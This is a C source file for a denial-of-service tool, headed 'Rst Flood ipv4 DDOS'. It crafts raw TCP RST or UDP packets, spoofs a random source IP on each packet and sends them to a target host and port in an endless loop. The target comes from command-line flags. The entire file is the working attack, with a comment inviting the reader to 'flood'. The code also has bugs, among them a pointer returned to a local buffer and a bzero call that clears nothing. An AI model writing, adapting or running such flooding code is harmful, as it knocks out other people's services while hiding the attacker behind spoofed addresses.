/*
	Rst Flood ipv4 DDOS
*/
#include <stdio.h>
#include <string.h> //memset
#include <sys/socket.h>
#include <stdlib.h>     //for exit(0);
#include <errno.h>      //For errno - the error number
#include <linux/tcp.h>  //Provides declarations for tcp header
#include <linux/udp.h>  //Provides declarations for udp header
#include <netinet/ip.h> //Provides declarations for ip header

unsigned short checksum(void *b, int len)
{
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

char *randonIP()
{
    int lower = 0;
    int upper = 255;
    char ip[15];
    int j = 0;
    for (int i = 1; i <= 4; i++)
    {
        int num = (rand() % (upper - lower + 1)) + lower;

        if (num < 10)
        {
            ip[j++] = num + '0';
        }
        else if (num > 9 && num < 100)
        {
            int y = num % 10;
            int x = num / 10;
            ip[j++] = x + '0';
            ip[j++] = y + '0';
        }
        else if (num > 99)
        {
            int z = num % 10;
            num /= 10;
            int y = num % 10;
            int x = num / 10;
            ip[j++] = x + '0';
            ip[j++] = y + '0';
            ip[j++] = z + '0';
        }

        if (i < 4)
        {
            ip[j++] = '.';
        }
    }
    ip[j] = '\0';
    printf("%s\n", ip);
    char *retIP = ip;
    return retIP;
}

void DdosTCP(char *ipdest, unsigned int port)
{
    printf("tcp\n%s\n%d\n", ipdest, port);
    //Create a raw socket
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0)
    {
        perror("cann't open socket");
    }

    //Datagram to represent the packet
    char datagram[4096], source_ip[32];
    //IP header
    struct iphdr *iph = (struct iphdr *)datagram;
    //TCP header
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
    struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ipdest);

    memset(datagram, 0, 4096); /* zero out the buffer */

    //Fill in the IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htons(54321); //Id of this packet
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0; //Set to 0 before calculating checksum
    iph->daddr = addr.sin_addr.s_addr;
    iph->check = checksum(datagram, iph->tot_len >> 1);

    //TCP Header
    tcph->source = htons(1234);
    tcph->dest = htons(port);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5; /* first and only tcp segment */
    tcph->fin = 0;
    tcph->syn = 0;
    tcph->rst = 1;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(5840); /* maximum allowed window size */
    tcph->check = 0;            /* if you set a checksum to zero, your kernel's IP stack
				should fill in the correct checksum during transmission */
    tcph->urg_ptr = 0;
    //Now the IP checksum
    tcph->check = checksum(datagram, sizeof(datagram));

    //IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    const int *val = &one;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        printf("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n", errno, strerror(errno));
        exit(0);
    }

    //Uncommend the loop if you want to flood :)
    while (1)
    {
        char *ipsrc = randonIP();
        strcpy(source_ip, ipsrc);
        iph->saddr = inet_addr(source_ip); //Spoof the source ip address

        //Send the packet
        if (sendto(s,                        /* our socket */
                   datagram,                 /* the buffer containing headers and data */
                   iph->tot_len,             /* total length of our datagram */
                   0,                        /* routing flags, normally always 0 */
                   (struct sockaddr *)&addr, /* socket addr, just like in */
                   sizeof(addr)) < 0)        /* a normal send() */
        {
            printf("error\n");
        }
        //Data send successfully
        else
        {
            printf("Packet Send \n");
        }
    }
}

void DdosUDP(char *ipdest, unsigned int port)
{
    printf("udp\n%s\n%d\n", ipdest, port);
    //Create a raw socket
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (s < 0)
    {
        perror("cann't open socket");
    }

    //Datagram to represent the packet
    char datagram[sizeof(struct iphdr) + sizeof(struct udphdr)], source_ip[32];
    //IP header
    struct iphdr *iph = (struct iphdr *)datagram;
    //UDP header
    struct udphdr *udph = (struct udphdr *)(datagram + sizeof(struct iphdr));
    struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ipdest);

    bzero(datagram, 0);

    //Fill in the IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr);
    iph->id = htons(54321); //Id of this packet
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0; //Set to 0 before calculating checksum
    iph->daddr = addr.sin_addr.s_addr;
    iph->check = checksum(datagram, iph->tot_len >> 1);

    //UDP Header
    udph->source = htons(1234);
    udph->dest = htons(port);
    udph->len = htons(sizeof(struct udphdr));
    udph->check = 0;            /* if you set a checksum to zero, your kernel's IP stack
				should fill in the correct checksum during transmission */
    //Now the IP checksum
    udph->check = checksum(datagram, sizeof(datagram));

    //IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    const int *val = &one;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        printf("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n", errno, strerror(errno));
        exit(0);
    }

    while (1)
    {
        char *ipsrc = randonIP();
        strcpy(source_ip, ipsrc);
        iph->saddr = inet_addr(source_ip); //Spoof the source ip address

        //Send the packet
        if (sendto(s,                        /* our socket */
                   datagram,                 /* the buffer containing headers and data */
                   iph->tot_len,             /* total length of our datagram */
                   0,                        /* routing flags, normally always 0 */
                   (struct sockaddr *)&addr, /* socket addr, just like in */
                   sizeof(addr)) < 0)        /* a normal send() */
        {
            printf("error\n");
        }
        //Data send successfully
        else
        {
            printf("Packet Send \n");
        }
    }
}

int main(int argv, char *args[])
{
    unsigned int port = 443;
    char *ipdest = "127.0.0.1";
    char *proto = "tcp";
    if (argv > 1)
    {
        for (size_t i = 0; i < argv; i++)
        {
            if (strcmp(args[i], "-t") == 0)
            {
                ipdest = args[++i];
                int length = strlen(ipdest);
                int points = 0;
                if (ipdest[0] == '.' || ipdest[length] == '.')
                {
                    perror("invalid argument");
                }
                for (int i = 0; i < length; i++)
                {
                    if (ipdest[i] == '.')
                    {
                        points++;
                    }
                    else if (ipdest[i] < '0' || ipdest[i] > '9')
                    {
                        perror("invalid argument");
                    }
                }
                if (points != 3)
                {
                    perror("invalid argument");
                }
            }
            if (strcmp(args[i], "-p") == 0)
            {
                char *portString = args[++i];
                for (int j = 0; j < strlen(portString); j++)
                {
                    if (ipdest[i] < '0' || ipdest[i] > '9')
                    {
                        perror("invalid argument");
                    }
                }
                port = atoi(portString);
            }
            if (strcmp(args[i], "-r") == 0)
            {
                proto = "udp";
            }
        }
    }
    if (strcmp(proto, "tcp") == 0)
    {
        DdosTCP(ipdest, port);
    }
    else
    {
        DdosUDP(ipdest, port);
    }
    return 0;
}